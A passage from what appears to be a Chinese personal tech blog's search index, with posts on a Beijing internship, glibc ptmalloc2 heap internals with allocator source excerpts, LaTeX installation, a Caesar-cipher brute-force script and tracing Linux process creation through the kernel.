五道口附近床位，还是要感谢大表哥帮我线下确认，入住过后发现很多厉害的人在北京和我一样因为没有足够的预算而选床位。印象比较深的是：中科大的研究生 (午出夜归), 清华直博的微软实习生，哈工大在能动所实习的研究生和他一起的天大化学研究生同学，报考北大哲学博士的南方人，苏科院学建筑的小伙; 那么多优秀人在北京和我挤在一起不知道是难过还是开心。这段生活经历让我体会到北漂这个词更多含义：精神上的孤独，物质上的贫乏，不过有的是对未来的信心。 北四环的霾 离职2016 年 6 月 29 日，一张单程票送走我第一次实习经历。返程的路上，整理了想法，对过去的总结，眼下的不足，未来的展望。 单程票 28 晚上自南京出发，29 号签完手续就撤退准备期末考，有点急了。到了学校，返程路上的想法被扯碎了，仿佛回到了原点，又是几天废我青春的生活。 尾要谢谢同事的关照，祝各位工作顺利，有缘再见。","tags":["life"]},{"title":"ptmalloc2","path":"/2016/06/14/ptmalloc2/","content":"0x00 introduction这篇是对笔记是对 [^Understanding] 学习的记录，需要预备知识 [^layout], 其余 [^freebuf1] 与 [^freebuf2] 是阿里人对他的翻译整理补充，同时给正经的开发人员裂墙安利 [^source].学习这个主要目的是掌握堆运作的基本流程与可能存在的问题。这个可以为堆安全问题 (double free, unlink, use-after-free etc) 学习与分析提供基础。其次是尝试总结出一个相对一致的内存管理模型 (这个想法来自于组内的一次分享:The GC of JAVA). 目前 C 语言主要几种堆管理机制是： dlmalloc - General purpose allocator ptmalloc2 - Glibc jemalloc - freebsd and firefox tcmalloc - Google libumem - Solaris 在 linux 系统上mem_strcut-&gt;start_brk与mm_struct-&gt;brk分别限定了堆的起止地址，进程可通过malloc,calloc,realloc,free,brk与sbrk来请求与释放 heap.其中只有brk是唯一的系统调用，其余的都是基于brk或mmap调用实现的。 brk: 这个系统调用相对简单，仅仅是改变mm_struct-&gt;brk, 新申请的区域不以 0 初始化。 mmap:malloc 利用mmap调用创建私有匿名的映射段，以 0 初始化。 在 ptmalloc2 设计时为了提高效率，做了一点预设，其中与brk和mmap相关的就是： 具有长生命周期的大内存分配使用 mmap. 特别大的内存分配总是使用 mmap. 具有短生命周期的内存分配使用 brk, 因为用 mmap 映射匿名页，当发生缺页异常时，kernel 为缺页分配一个新物理页并清 0, 一个 mmap 的内存块需要映射多个物理页，导致多次清 0 操作，很浪费系统资源，所以引入了 mmap 分配阈值动态调整机制保证在必要的情况下才使用 mmap 分配内存。 0x01 the ptmalloc2’s behaviour主要利用下面代码来初步窥视 glibc 中堆得一些具体行为，引用源码来自 glibc 2.23. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* gcc mthread.c -lpthread */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123;\tprintf(&quot;Before malloc in thread 1 &quot;);\tgetchar();\tchar* addr = (char*) malloc(1000);\tprintf(&quot;After malloc and before free in thread 1 &quot;);\tgetchar();\tfree(addr);\tprintf(&quot;After free in thread 1 &quot;);\tgetchar();&#125;int main() &#123;\tpthread_t t1;\tvoid* s;\tint ret;\tchar* addr;\tprintf(&quot;Welcome to per thread arena example::%d &quot;,getpid());\tprintf(&quot;Before malloc in main thread &quot;);\tgetchar();\taddr = (char*) malloc(1000);\tprintf(&quot;After malloc and before free in main thread &quot;);\tgetchar();\tfree(addr);\tprintf(&quot;After free in main thread &quot;);\tgetchar();\tret = pthread_create(&amp;t1, NULL, threadFunc, NULL);\tif(ret)\t&#123; printf(&quot;Thread creation error &quot;); return -1;\t&#125;\tret = pthread_join(t1, &amp;s);\tif(ret)\t&#123; printf(&quot;Thread join error &quot;); return -1;\t&#125;\treturn 0;&#125; Before malloc in main thread:这个阶段可以看见程序是没有堆空间的 (如果有会有一个 heap 表示出来，且那个内存区域是 rw 的权限). 123408048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.outb7e05000-b7e07000 rw-p 00000000 00:00 0 After malloc and before free in main thread:主线程调用了malloc(1000)过后，可以系统在数据段相邻的地方提供了 132KB 大小的空间，这个空间被称为 arena, 也由于是主线程创建也被称为 main_arena.132KB 比 1000 字节大太多，后面主线程继续申请空间会先从 main_arena 这里扣除，直到不够用系统会继续增加 arena 的大小。 1234508048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7e05000-b7e07000 rw-p 00000000 00:00 0 After free in main thread:在主线程调用 free 之后，内存布局还没有变，free()操作并不是直接把内存给操作系统，而是给库函数加以管理。它会将已经释放的chunk(heap 的最小内存单位) 添加到main_arean的 bin(这是一种用于存储同类型 free chunk 的双链表数据结构) 中。下次申请堆空间时候优先从 bin 中找合适的 chunk. 1234508048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7e05000-b7e07000 rw-p 00000000 00:00 0 Before malloc in thread 1:可以看到用户线程在没有申请对空间是没有默认线程堆空间的，但是有默认线程栈。 12345608048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7604000-b7605000 ---p 00000000 00:00 0b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:11284] After malloc and before free in thread 1:在 thread1 调用malloc()后创建了堆空间 (no_main_arena), 其起始地址是 0xb7500000 与前面的 data segment 不连续可以猜测这是由mmap分配的。非主线程每次利用mmap像操作申请MAX_HEAP_SIZE(32 位系统默认 1M) 大小的虚拟内存，在从其中切割出 0xb7521000-0xb7500000 给用户线程。 1234567808048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7500000-b7521000 rw-p 00000000 00:00 0b7521000-b7600000 ---p 00000000 00:00 0b7604000-b7605000 ---p 00000000 00:00 0b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:11284] After free in thread 1:内存的 layout 也没有发生变化，这个主线程行为一致。 1234567808048000-08049000 r-xp 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out08049000-0804a000 r--p 00000000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804a000-0804b000 rw-p 00001000 fc:00 393219 /home/guowang/lsploits/hof/ptmalloc.ppt/mthread/a.out0804b000-0806c000 rw-p 00000000 00:00 0 [heap]b7500000-b7521000 rw-p 00000000 00:00 0b7521000-b7600000 ---p 00000000 00:00 0b7604000-b7605000 ---p 00000000 00:00 0b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:11284] 0x10 the implementation of ptmalloc20x11 arena从 ptmalloc 看到了”主线程和用户线程 1 都有自己的 arena”, 但是是事实上没有并不是为每线程的 arena, 系统最多支持的 arena 的个数取决于 core 的个数和系统位数(core*2+1). 12345678910111213...int n = __get_nprocs (); if (n &gt;= 1) narenas_limit = NARENAS_FROM_NCORES (n); else /* We have no information about the system. Assume two cores. */ narenas_limit = NARENAS_FROM_NCORES (2);...#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1) 1: 主线程调malloc()后创建main_arena: 12#define arena_for_chunk(ptr) \\ (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena) 12/* check for chunk from non-main arena */#define chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA) 123456static struct malloc_state main_arena =&#123; .mutex = _LIBC_LOCK_INITIALIZER, .next = &amp;main_arena, .attached_threads = 1&#125;; 2: 用户线程创建调用malloc()经过一些调用后进入arena_get2(), 如果没有达到进程的arena你上限则调用_int_new_arena()为当前线程创建arena, 如果达到上限，会复用现有的arena(遍历有 arena 组成的链表并尝试上锁，如果锁失败，尝试下一个，如果成功则返回其arena, 表示其可以被当前线程所使用) 123456789101112131415161718192021222324static mstateinternal_functionarena_get2 (size_t size, mstate avoid_arena)&#123; mstate a; static size_t narenas_limit; ... repeat:; size_t n = narenas; if (__glibc_unlikely (n &lt;= narenas_limit - 1)) &#123; if (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + 1, n)) goto repeat; a = _int_new_arena (size); if (__glibc_unlikely (a == NULL)) catomic_decrement (&amp;narenas); &#125; else a = reused_arena (avoid_arena); // 复用！ &#125; return a;&#125; 3: 如果在arena链表里面没有找到可以用的，会阻塞到有可用的为止。 1234567891011121314static mstatereused_arena (mstate avoid_arena)&#123; mstate result; ... /* No arena available without contention. Wait for the next in line. */ LIBC_PROBE (memory_arena_reuse_wait, 3, &amp;result-&gt;mutex, result, avoid_arena); (void) mutex_lock (&amp;result-&gt;mutex); // 这里，在看注释 ... return result;&#125; 0x12 data struct in heapglibc 中堆管理对几个术语下定义 [^wiki]: Chunk: A small range of memory that can be allocated (owned by the application), freed (owned by glibc), or combined with adjacent chunks into larger ranges. Note that a chunk is a wrapper around the block of memory that is given to the application. Each chunk exists in one heap and belongs to one arena. Arena: A structure that is shared among one or more threads which contains references to one or more heaps, as well as linked lists of chunks within those heaps which are “free”. Threads assigned to each arena will allocate memory from that arena’s free lists. Heap: A contiguous region of memory that is subdivided into chunks to be allocated. Each heap belongs to exactly one arena. 管理过程中主要涉及的三个核心结构体如下： malloc_chunkmalloc_chunk是chunk header, 一个heap被分为多个chunk, 其大小有用户请求所决定，每一个chunk都有自己的malloc_chunk. 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; heap_infoheap_info是heap header, 因为no_main_arena可以包含多个heap, 为了方便管理就每heap一个heap_info.如果当前 heap 不够用时候，malloc会调用mmap来分配新对空间，新空间会被添加到no_main_arena. 这种情况no_main_arena就包含多个heap_info.main_arena不包含多个heap所以也就不含有heap_info. 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; malloc_statemalloc_state是arena header, 每个no_main_arean可能包含多个heap_info, 但是只能有一个malloc_state,malloc其中包含chunk容器的一些信息。不同于no_main_arena,main_arena的malloc_state并不是 sbrk heap segement 的一部分，而是一个全局变量 (main_arena) 属于 libc.so 的 data segment. 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; heap segment relationship with arena图示main_arena与no_main_arean(single heap) main_arena 图示no_main_arena(multiple heap) with multiple heaps 0x13 chunk Glibc’s malloc is chunk-oriented. It divides a large region of memory (a “heap”) into chunks of various sizes. Each chunk includes meta-data about how big it is (via a size field in the chunk header), and thus where the adjacent chunks are. When a chunk is in use by the application, the only data that’s “remembered” is the size of the chunk. When the chunk is free’d, the memory that used to be application data is re-purposed for additional arena-related information, such as pointers within linked lists, such that suitable chunks can quickly be found and re-used when needed. Also, the last word in a free’d chunk contains a copy of the chunk size (with the three LSBs set to zeros, vs the three LSBs of the size at the front of the chunk which are used for flags).[^wiki] chunk有两个状态分别是：allocated chunk，free chunk. allocated chunk: allocated 1: malloc_chunk-&gt;prev_size如果前的chunk的是 free 的，那这域里面填充前面的chunk的 size. 如果前chunk是 allocated, 这个地方包含前一个chunk的用户数据。2: malloc_chunk-&gt;size是当前allocated chunk的大小 (包含头部), 最后 3bit 是 flag 的信息 [^wiki].3: 其他的区域在allocted chunk(比如 fd,bk) 是没有意义的，它们的位置被用户存放数据。 free chunk free 1: malloc_chunk-&gt;prev_size, 不能有两个 free 的 chunk 相邻 (一般合并为一个), 因此free chunk的malloc-&gt;prev_size是个allocated chunk的用户数据。2: malloc_chunk-&gt;size记录当前free chunk的size.3: malloc_chunk-&gt;fd(forwar pointer) 指向同一个 bin 的前一个 chunk.4: malloc_chunk-&gt;bk(backward pointer) 指向同一个 bin 的后一个 chunk. 0x15 bins因为ptmalloc内存分配都是以chunk为单位的，对空闲的chunk, 采用分箱式内存管理方式，根据空闲chunk大小和使用情况将其放在四种不同的bin中，这四个空闲 chunk 的容器包括fast bins,small bins和large bins,unsorted bins. glibc中用于记录bin的数据结构有两个 [^source]. fastbinsY: 这是一个数组里面记录所有的 fast bins. bins: 也是一个数组，记录 fast bins 之外的 bins, 分别是:1:unsorted bin;2-63:small bin;64-126: large bin. 1234567891011struct malloc_state&#123; .... /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; ... /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; // #define NBINS 128 // bins 数组能存放 254 个 mchunkptr 指针，被用来存放 126 头结点指针。 ...&#125;; fast bins number: 10 data struct: 单链表 (fd only), 在 fast_bin 中的操作 (添，删) 都在表尾操作。更具体点就是 LIFO 算法：添加操作 (free) 就是将新的 fast chunk 加入链表尾，删除操作 (malloc) 就是将链表尾部的 fast chunk 删除。需要注意的是，为了实现 LIFO 算法，fastbinsY 数组中每个 fastbin 元素均指向了该链表的尾结点，而尾结点通过其 fd 指针指向前一个结点，依次类推。 chunksize: 10 个 fast_bin 中包含的 chunk 的 size 是按照 8 递增排列的，即第一个 fast_bin 中所有 chunk size 均为 16 字节，第二个 fast bin 中为 24 字节，依次类推。在进行 malloc 初始化的时候，最大的 fast_chunk_size 被设置为 80 字节，因此默认情况下大小为 16 到 80 字节的 chunk 被分类到 fast chunk. free chunk: 不会对 free chunk 进行合并操作。设计 fast bins 的初衷就是进行快速的小内存分配和释放，因此系统将属于 fast bin 的 chunk 的 P(未使用标志位) 总是设置为 1, 这样即使当 fast bin 中有某个 chunk 同一个 free chunk 相邻的时候，系统也不会进行自动合并操作，但是可能会造成额外的碎片化问题。 initialization: 第一次调用 malloc(fast bin) 的时候，系统执行_int_malloc 函数，该函数首先会发现当前 fast bin 为空，就转交给 small bin 处理，进而又发现 small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能： 首先判断当前malloc_state结构体中的 fast bin 是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。 malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除 fast bin 之外的所有的 bins(构建双链表), 再初始化 fast bin. malloc operation：即用户通过malloc请求的大小属于 fast chunk 的大小范围 (! 用户请求 size 加上 16 字节就是实际内存 chunk size), 在初始化的时候 fast bin 支持的最大内存大小以及所有 fast bin 链表都是空的，所以当最开始使用 malloc 申请内存的时候，即使申请的内存大小属于 fast chunk 的内存大小，它也不会交由 fast bin 来处理，而是向下传递交由 small bin 来处理，如果 small bin 也为空的话就交给 unsorted bin 处理。 free operation: 主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的 fast bin, 然后再将此 chunk 添加到该 fast bin 的链尾即可。整个操作都是在_int_free()函数中完成。 fast_bin small bins number: 62 chunk size: 同一个 small_bin 里面的 chunk_size 大小是一样的，第一个 small_bin 的 chunk_size 为 16 字节，后面以 8 为等差递增，即最后一个 small_bin 的 chunk_size 为 512bytes. merge: 相邻的 free_chunk 需要进行合并操作，即合并成一个大的 free chunk. malloc operation: 类似于 fast bins, 最初所有的 small bin 都是空的，因此在对这些 small bin 完成初始化之前，即使用户请求的内存大小属于 small chunk 也不会交由 small bin 进行处理，而是交由 unsorted bin 处理，如果 unsorted bin 也不能处理的话，会依次遍历后续的所有 bins, 找出第一个满足要求的 bin, 如果所有的 bin 都不满足的话，就转而使用top chunk. 如果top chunk大小不够，那么就扩充top chunk, 这样能满足需求。 如果top chunk满足的话，那么久从中切割出用户请求的大小，剩余的部分放入unsorted bin的remainder chunk, 此外这个chunk还成为了last remainder chunk以改善局部性当随后的请求是请求一块 small chunk 并且 last remainder chunk 是 unsorted bin 中唯一的 chunk,last remainder chunk 就分割成两部分: 返回给用户的 user chunk, 添加到 unsorted bin 中的 remainder chunk. 此外, 这一 remainder chunk 还会成为最新的 last remainder chunk. 因此随后的内存分配最终导致各 chunk 被分配得彼此贴近. free operation: 当释放 small chunk 的时候，先检查该 chunk 相邻的 chunk 是否为 free, 如果是的话就进行合并操作：合并成新的 chunk, 然后将它们从 small bin 中移动到 unsorted bin 中。 large bins number: 63 chunk_size: 前 32 个 large_bin 依次以 64 字节递增，即第一个 large bin 中 chunk size 为 512-575 字节，第二个 large bin 中 chunk size 为 576-639 字节，紧随其后的 16 个 large bin 依次以 512 字节步长为间隔; 之后的 8 个 bin 以步长 4096 为间隔; 再之后的 4 个 bin 以 32768 字节为间隔; 之后的 2 个 bin 以 262144 字节为间隔; 剩下的 chunk 放在最后一个 large bin 中，large bin 的位置是递减的。 merge operation: 相邻的 free_chunk 合并为一个更大的 free_chunk. malloc operation: 初始化完成之前的操作类似于 small_bin, 初始化完成之后，首先确定用户请求的大小属于哪一个 large bin, 然后判断该 large bin 中最大的 chunk 的 size 是否大于用户请求的 size. 如果大于，就从尾开始遍历该 large bin, 找到第一个 size 相等或接近的 chunk, 分配给用户。如果该 chunk 大于用户请求的 size 的话，就将该 chunk 拆分为两个 chunk：前者返回给用户，且 size 等同于用户请求的 size；剩余的部分做为一个新的 chunk 添加到 unsorted bin 中。 如果小于，那么就依次查看后续的 large bin 中是否有满足需求的 chunk, 需要注意的是鉴于 bin 的个数较多 (不同 bin 中的 chunk 极有可能在不同的内存页中), 如果按照上一段中介绍的方法进行遍历的话 (即遍历每个 bin 中的 chunk), 可能会发生多次page_fault, 进而严重影响速度，所以 ptmalloc 设计了 Binmap 结构体来帮助提高 bin-by-bin 的检索速度.Bitmap 记录了各个 bin 中是否为空，如果通过 binmap 找到了下一个非空的 large bin 的话，就按照上一段中的方法分配 chunk, 否则就使用 top chunk 来分配合适的内存。 free opertation: 当释放 large chunk 的时候，先检查该 chunk 相邻的 chunk 是否为 free, 如果是的话就进行合并操作：将这些 chunks 合并成新的 chunk, 后将它们移到 unsorted bin. unsorted bins回收的 chunk 块必须先放到 unsorted bins 中，分配内存时会查看 unsorted bins 中是否有合适的 chunk, 如果找到满足条件的 chunk, 则直接返回给用户，否则 unsorted bins 的所有 chunk 放入 small_bin 或是 large_bin 中。 number: 1 个 chunk size: 无限制 large references[^Understanding]: Understanding glibc malloc[^freebuf1]: Linux 堆内存管理深入分析（上）[^freebuf2]: Linux 堆内存管理深入分析（下）[^source]: glibc 内存管理 ptmalloc 源代码分析.pdf[^layout]: memory layout[^wiki]: glibc&#x2F;wiki&#x2F;","tags":["linux"]},{"title":"install latex","path":"/2016/05/24/latex/","content":"0x00 install不得不说 latex 手工安装很麻烦，一次安装齐了宏包很省心。 0x01 fedora24安装命令： 123dnf install texlive-collection-fontsrecommended texlive-xetex texlive-latex \\ texlive-titlesec &#x27;tex(datetime.sty)&#x27; &#x27;tex(eu1enc.def)&#x27; &#x27;tex(polyglossia.sty)&#x27; dnf install texlive-mdframed\\* 0x02 macmac 下面直接安装 texlive, 安装好了过后注意设置一下PATH. 0x10 fonts0x11 fedora24把下面链接 ^fonts 里面的压缩包解压放到系统字体路径里面。 12# cat /usr/share/texlive/texmf.cnf OSFONTDIR = /usr/share/fonts// 0x12 mac也是要注意设置字体相关选项。","tags":["tips"]},{"title":"caesar brute force","path":"/2016/05/22/caesar/","content":"0x00 Caesar encryption之前玩 ctf 遇到的这个类型题目，于是写个脚本来破解，暴力破解相对猜 key 来说简单一些，所有脚本只支持暴力破解，不过算法可以单独取出来用。 0x01 implementation关于这个密码故事参考 [^wiki]. 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python3&#x27;&#x27;&#x27;This script for Caesar brute decryption.&#x27;&#x27;&#x27;__author__ = &quot;Sn0rt@abc.shop.edu.cn&quot;import stringMAX_KEY_SZIE = 26def get_message(): print(&#x27;enter you message: &#x27;) return input().lower()def brute(message): for key in range(1, MAX_KEY_SZIE + 1): print(&quot;%s&quot; % decryption(key, message))def decryption(key, message): key = 0 - key transled = &#x27;&#x27; for symbol in message: if symbol.isalpha(): num = ord(symbol) num += key if num &gt; ord(&#x27;z&#x27;): num -= 26 elif num &lt; ord(&#x27;a&#x27;): num += 26 transled += chr(num) else: transled += symbol return transledbrute(get_message())","tags":["cryptography"]},{"title":"how to create a process","path":"/2016/05/07/how-to-create-process/","content":"在操作系统教科书中进程是一个非常重要的概念，书中定义为“系统进行资源分配和调度的基本单位”,初步接触 Linux kernel 准备进程概念开始。 0x00 process descriptor在 Linux 中表示 PCB（进程控制块）的结构体叫 task_struct. task_strcut 相关的信息放在 include&#x2F;linux&#x2F;sched.h 中，而单独看 task_struct 意义不是很大，很难把握到 Linux 的进程工作原理，所以才有了本文来梳理 Linux 进程管理的信息。 0x01 how to crate a process ?可以通过 fork 系统调用创建一个进程 1234567891011121314#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(void)&#123; pid_t pid; pid = fork(); if (pid == 0) &#123; printf(&quot;child &quot;); &#125; else &#123; printf(&quot;parent &quot;); &#125; return 0;&#125; Linux 下创建进程会完全复制它的父进程，所以 fork 调用成功返回两次，在父进程中范围子进程 pid，子进程中返回 0。 0x02 what happened in kernel ?这里需要引入系统调用的概念，简而言之系统调用是用户通过 API 和系统沟通的方式。上述源代码会通过系统调用在 Linux 中创建进程。观察系统调用有个好工具strace, -f是继续跟踪子进程。 123456789101112131415161718192021222324# strace -f ./a.out...clone(strace: Process 2035 attachedchild_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fd18ba619d0) = 2035[pid 2034] fstat(1, &lt;unfinished ...&gt;[pid 2035] fstat(1, &lt;unfinished ...&gt;[pid 2034] &lt;... fstat resumed&gt; &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 5), ...&#125;) = 0[pid 2035] &lt;... fstat resumed&gt; &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 5), ...&#125;) = 0[pid 2034] brk(NULL) = 0xd73000[pid 2034] brk(0xd94000 &lt;unfinished ...&gt;[pid 2035] brk(NULL &lt;unfinished ...&gt;[pid 2034] &lt;... brk resumed&gt; ) = 0xd94000[pid 2034] brk(NULL) = 0xd94000[pid 2034] write(1, &quot;parent &quot;, 7 &lt;unfinished ...&gt;[pid 2035] &lt;... brk resumed&gt; ) = 0xd73000parent [pid 2034] &lt;... write resumed&gt; ) = 7[pid 2034] exit_group(0) = ?[pid 2035] brk(0xd94000 &lt;unfinished ...&gt;[pid 2034] +++ exited with 0 +++&lt;... brk resumed&gt; ) = 0xd94000brk(NULL) = 0xd94000write(1, &quot;child &quot;, 6child ) = 6exit_group(0) = ?+++ exited with 0 +++ 可以看到在 x86_64 下 fork 函数创建一个进程是通过系统调用 clone (在调用 clone 之前的东西可以在 glibc) 来做的，通过一些看上起奇怪的 flags 的组合来达到创建一个进程的目的。系统调用层面之下就是 Linux kernel 了。 下面通过 kernel 4.12-rc2 源代码跟踪一下 clone 系统调用的过程（大体流程依然和 ^ulk 说的类似但是，细节有点不同，参考1d4b4b2994b5fc208963c0b795291f8c1f18becf），clone 在系统调用表中的 stub_clone 实现，stub_clone 由 sys_clone 定义，而 sys_clone 在 64 位下# define __ARCH_WANT_SYS_CLONE，后在 fork.c 里面进行条件编译： 123456789101112131415161718192021222324252627#ifdef __ARCH_WANT_SYS_CLONE#ifdef CONFIG_CLONE_BACKWARDSSYSCALL_DEFINE5(clone, unsigned long, clone_flags, unsigned long, newsp, int __user *, parent_tidptr, unsigned long, tls, int __user *, child_tidptr)#elif defined(CONFIG_CLONE_BACKWARDS2)SYSCALL_DEFINE5(clone, unsigned long, newsp, unsigned long, clone_flags, int __user *, parent_tidptr, int __user *, child_tidptr, unsigned long, tls)#elif defined(CONFIG_CLONE_BACKWARDS3)SYSCALL_DEFINE6(clone, unsigned long, clone_flags, unsigned long, newsp, int, stack_size, int __user *, parent_tidptr, int __user *, child_tidptr, unsigned long, tls)#elseSYSCALL_DEFINE5(clone, unsigned long, clone_flags, unsigned long, newsp, int __user *, parent_tidptr, int __user *, child_tidptr, unsigned long, tls)#endif&#123; return _do_fork(clone_flags, newsp, 0, parent_tidptr, child_tidptr, tls);&#125;#endif 看到 sys_clone 实现是配置相关的，参数不同，最后调用 _do_fork (不同于之前调用 do_fork) 进入下一个流程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/* * Ok, this is the main fork-routine. * * It copies the process, and if successful kick-starts * it and waits for it to finish using the VM if required. */long _do_fork(unsigned long clone_flags, unsigned long stack_start, unsigned long stack_size, int __user *parent_tidptr, int __user *child_tidptr, unsigned long tls)&#123; struct task_struct *p; int trace = 0; long nr; /* * Determine whether and which event to report to ptracer. When * called from kernel_thread or CLONE_UNTRACED is explicitly * requested, no event is reported; otherwise, report if the event * for the type of forking is enabled. */ if (!(clone_flags &amp; CLONE_UNTRACED)) &#123; if (clone_flags &amp; CLONE_VFORK) trace = PTRACE_EVENT_VFORK; else if ((clone_flags &amp; CSIGNAL) != SIGCHLD) trace = PTRACE_EVENT_CLONE; else trace = PTRACE_EVENT_FORK; if (likely(!ptrace_event_enabled(current, trace))) trace = 0; &#125; p = copy_process(clone_flags, stack_start, stack_size, child_tidptr, NULL, trace, tls, NUMA_NO_NODE); add_latent_entropy(); /* * Do this prior waking up the new thread - the thread pointer * might get invalid after that point, if the thread exits quickly. */ if (!IS_ERR(p)) &#123; struct completion vfork; struct pid *pid; trace_sched_process_fork(current, p); pid = get_task_pid(p, PIDTYPE_PID); nr = pid_vnr(pid); if (clone_flags &amp; CLONE_PARENT_SETTID) put_user(nr, parent_tidptr); if (clone_flags &amp; CLONE_VFORK) &#123; p-&gt;vfork_done = &amp;vfork; init_completion(&amp;vfork); get_task_struct(p); &#125; wake_up_new_task(p); /* forking complete and child started to run, tell ptracer */ if (unlikely(trace)) ptrace_event_pid(trace, pid); if (clone_flags &amp; CLONE_VFORK) &#123; if (!wait_for_vfork_done(p, &amp;vfork)) ptrace_event_pid(PTRACE_EVENT_VFORK_DONE, pid); &#125; put_pid(pid); &#125; else &#123; nr = PTR_ERR(p); &#125; return nr;&#125; _do_fork函数不是很长，主要做了几件事情 (因为没有 vfork 所以不关注它的处理路径)： copy_process 函数准备进进程的地址空间。 如果 p 有效，通过 get_task_pid 分配 pid，通过 wake_up_new_task 将新 p 加入调度器。 这里需要引入systemtap来观察 kernel，工作原理简而言之就是在通过调试信息在内核函数调用之前或之后插入一些预定义的代码。 1234probe kernel.function(&quot;_do_fork&quot;).return &#123; printf(&quot;sys_clone hit &quot;); printf(&quot;do_frok return pid: %d &quot;, $return);&#125; 可以看_do_fork 代码看到返回值是新进程的 pid，我们可以在它的换回点验证一下和用户态对比。 systemtap 输出： 12345678910111213141516171819202122232425stap -v fork.stpPass 1: parsed user script and 468 library scripts using 245968virt/45604res/7552shr/38236data kb, in 100usr/10sys/108real ms.Pass 2: analyzed script: 1 probe, 1 function, 0 embeds, 0 globals using 296808virt/97496res/8480shr/89076data kb, in 830usr/80sys/811real ms.Pass 3: using cached 